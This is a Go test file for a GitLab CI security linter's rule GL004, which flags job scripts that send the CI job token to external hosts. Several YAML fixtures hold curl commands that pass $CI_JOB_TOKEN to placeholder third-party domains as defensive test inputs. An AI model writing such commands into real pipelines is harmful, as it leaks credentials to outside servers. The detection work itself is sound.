package rules

import (
	"testing"

	"github.com/glsec/glsec/internal/finding"
	"github.com/glsec/glsec/internal/parser"
)

func findings004(t *testing.T, yaml string) []finding.Finding {
	t.Helper()
	doc, err := parser.Parse([]byte(yaml), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	return GL004.Check(doc.Root, "test.yml")
}

func TestGL004_ExternalHost(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://third-party.com/api/upload
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(f))
	}
	if f[0].Severity != finding.Warn {
		t.Errorf("expected Warn severity")
	}
}

func TestGL004_TokenInURL(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - curl https://external.example.com/upload?token=$CI_JOB_TOKEN
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for token in URL, got %d", len(f))
	}
}

func TestGL004_GitLabComSafe(t *testing.T) {
	f := findings004(t, `
download:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://gitlab.com/api/v4/packages
`)
	if len(f) != 0 {
		t.Errorf("expected no findings for gitlab.com, got %d", len(f))
	}
}

func TestGL004_GitLabSubdomainSafe(t *testing.T) {
	f := findings004(t, `
download:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://registry.gitlab.com/my-project
`)
	if len(f) != 0 {
		t.Errorf("expected no findings for gitlab.com subdomain, got %d", len(f))
	}
}

func TestGL004_NoURL(t *testing.T) {
	f := findings004(t, `
build:
  script:
    - ./deploy.sh --token $CI_JOB_TOKEN
`)
	if len(f) != 0 {
		t.Errorf("expected no findings when no explicit URL present, got %d", len(f))
	}
}

func TestGL004_BraceForm(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - curl --header JOB-TOKEN=${CI_JOB_TOKEN} https://external.com/upload
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for brace form, got %d", len(f))
	}
}

func TestGL004_BeforeScript(t *testing.T) {
	f := findings004(t, `
build:
  before_script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://external.com/setup
  script:
    - make
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding in before_script, got %d", len(f))
	}
}

func TestGL004_LineNumbers(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://external.com/upload
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding")
	}
	if f[0].Line == 0 {
		t.Error("expected non-zero line number")
	}
}
